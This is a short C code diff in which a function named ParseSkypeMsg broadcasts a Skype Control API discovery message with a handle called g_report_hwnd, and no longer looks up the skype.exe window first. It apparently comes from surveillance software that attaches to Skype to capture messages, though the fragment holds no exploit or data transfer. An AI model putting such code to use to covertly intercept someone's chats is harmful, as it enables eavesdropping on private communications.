@@ -2283,10 +2283,7 @@ BOOL ParseSkypeMsg(BYTE *msg, DWORD *pdwLen, DWORD *pdwFlags)
 	if (*pdwFlags & FLAGS_SKAPI_ATT) {
 		// Deve mandare il messaggio per il discovery
 		UINT msg_type = RegisterWindowMessage("SkypeControlAPIDiscover");
-		HWND skype_wnd = HM_GetProcessWindow("skype.exe");
-		if (skype_wnd == NULL || msg_type == 0)
-			return TRUE;
-		HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)skype_wnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
+		HM_SafeSendMessageTimeoutW(HWND_BROADCAST, msg_type, (WPARAM)g_report_hwnd, (LPARAM)NULL, SMTO_NORMAL, 500, NULL);
 
 		return TRUE;
 	}
